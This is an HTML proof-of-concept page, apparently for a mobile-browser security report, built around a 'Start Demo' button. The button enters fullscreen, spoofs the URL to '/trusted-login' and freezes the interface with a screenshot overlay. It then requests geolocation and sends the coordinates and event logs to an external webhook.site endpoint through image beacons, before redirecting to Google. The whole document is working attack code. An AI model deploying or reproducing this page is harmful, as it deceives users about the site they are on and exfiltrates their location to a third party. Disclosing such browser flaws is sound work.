<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Android Geo Final PoC</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

<style>
body {
  margin:0;
  font-family:system-ui;
  background:#f5f5f7;
  text-align:center;
}
button {
  margin-top:100px;
  font-size:16px;
  padding:14px 18px;
  border-radius:12px;
  border:none;
  background:#007aff;
  color:#fff;
}
#output {
  margin-top:20px;
  font-size:14px;
}
</style>
</head>

<body>

<button id="start">Start Demo nice</button>
<p id="output">Location: -</p>

<script>
const TARGET = "https://www.google.com";
const LOG_ENDPOINT = "https://webhook.site/df32222f-b4a8-431a-872e-c4df63570c74";

let triggered = false;

// ===== LOGGER (VERSI KAMU) =====
function logEvent(type, extra = {}) {
  const data = {
    type,
    ts: performance.now().toFixed(3),
    epoch: Date.now(),
    url: location.href,
    origin: location.origin,
    visibility: document.visibilityState,
    readyState: document.readyState,
    ...extra
  };

  const params = new URLSearchParams(data).toString();

  new Image().src = `${LOG_ENDPOINT}?${params}`;
}

// ===== FREEZE UI =====
function freezeUI() {
  return html2canvas(document.body,{scale:2}).then(canvas=>{
    const img = document.createElement("img");
    img.src = canvas.toDataURL();

    Object.assign(img.style,{
      position:"fixed",
      top:"0",
      left:"0",
      width:"100vw",
      height:"100vh",
      zIndex:"999999"
    });

    document.body.innerHTML="";
    document.body.appendChild(img);

    logEvent("ui_frozen");
  });
}

// ===== GEO (VERSI KAMU) =====
function getLocation() {
  if (!navigator.geolocation) return;

  logEvent("geolocation_requested");

  navigator.geolocation.getCurrentPosition(
    pos => {
      logEvent("geolocation_success", {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude
      });

      // tetap log ke UI (kalau sempat sebelum freeze)
      const out = document.getElementById("output");
      if (out) {
        out.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`;
      }
    },
    err => {
      logEvent("geolocation_error", { code: err.code });

      const out = document.getElementById("output");
      if (out) {
        out.textContent = 'Permission denied';
      }
    }
  );
}

// ===== REDIRECT DELAY =====
function delayedRedirect() {
  if (triggered) return;
  triggered = true;

  logEvent("returned_from_settings");

  setTimeout(() => {
    logEvent("redirecting", {target: TARGET});

    // 🔥 pakai href sesuai request kamu
    location.href = TARGET;

  }, 2800);
}

// ===== DETECT BALIK =====
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    delayedRedirect();
  }
});

window.addEventListener("focus", delayedRedirect);
window.addEventListener("pageshow", delayedRedirect);

// ===== START =====
document.getElementById("start").onclick = () => {

  logEvent("poc_started");

  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen();
  }

  history.replaceState({}, '', '/trusted-login');
  logEvent("url_spoofed");

  freezeUI().then(()=>{
    setTimeout(()=>{
      getLocation(); // pakai versi kamu
    },100);
  });
};

</script>

</body>
</html>
